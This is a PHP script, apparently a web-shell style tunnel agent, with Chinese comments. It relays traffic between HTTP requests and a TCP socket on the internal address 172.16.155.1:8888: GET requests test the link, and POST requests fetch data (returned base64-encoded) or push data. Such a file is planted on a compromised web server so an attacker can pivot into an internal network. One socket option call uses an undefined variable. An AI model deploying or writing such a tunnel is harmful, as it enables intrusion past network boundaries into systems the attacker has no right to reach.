<?php
ini_set("display_errors","Off");
//dl("php_sockets.dll");


// 检测连接是否成功
if ($_SERVER['REQUEST_METHOD']==='GET') 
{
    // var_dump(function_exists("socket_create"));
    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    @socket_connect($sock, '172.16.155.1', 8888);
    $msg = 'TO:CONNECT';
    socket_write($sock,$msg);
    $res = socket_read($sock,4096);
    echo $res;
    socket_close($sock);
}

// // 代理获取数据
if ($_SERVER['REQUEST_METHOD']==='POST' && !empty($_POST['DataType'])){
    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    @socket_connect($sock, '172.16.155.1', 8888);
    socket_set_option($sock,SOL_SOCKET,SO_RCVTIMEO,array("sec"=>3, "usec"=>0 ));
    socket_set_option($socket,SOL_SOCKET,SO_SNDTIMEO,array("sec"=> 3, "usec"=> 0 ) );
    if ($_POST['DataType'] === 'GetData')
    {
        $msg = 'TO:GET';
        socket_write($sock,$msg);
        $res = socket_read($sock,4096);
        if ($res){
            echo base64_encode($res);
        }else{
            echo "NO DATA";
        }
    }else if ($_POST['DataType'] === 'PostData' && !empty($_POST['Data'])) 
    {   
        $msg = $_POST['Data'];
        $res = socket_write($sock,$msg);
        // if ($res){
        //     echo "Send OK";
        // }else{
        //     echo "Send Failed";
    // }
    }
    socket_close($sock);
    
}



?>